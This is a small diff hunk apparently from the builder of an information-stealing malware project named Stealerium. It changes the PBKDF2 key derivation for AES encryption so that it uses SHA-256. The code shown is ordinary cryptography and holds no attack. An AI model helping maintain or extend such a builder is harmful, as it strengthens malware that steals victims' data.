@@ -36,7 +36,7 @@ namespace Stealerium.Builder
                 {
                     aes.KeySize = 256;
                     aes.BlockSize = 128;
-                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(CryptKey, SaltBytes, 1000);
+                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(CryptKey, SaltBytes, 1000, HashAlgorithmName.SHA256);
                     aes.Key = key.GetBytes(aes.KeySize / 8);
                     aes.IV = key.GetBytes(aes.BlockSize / 8);
                     aes.Mode = CipherMode.CBC;
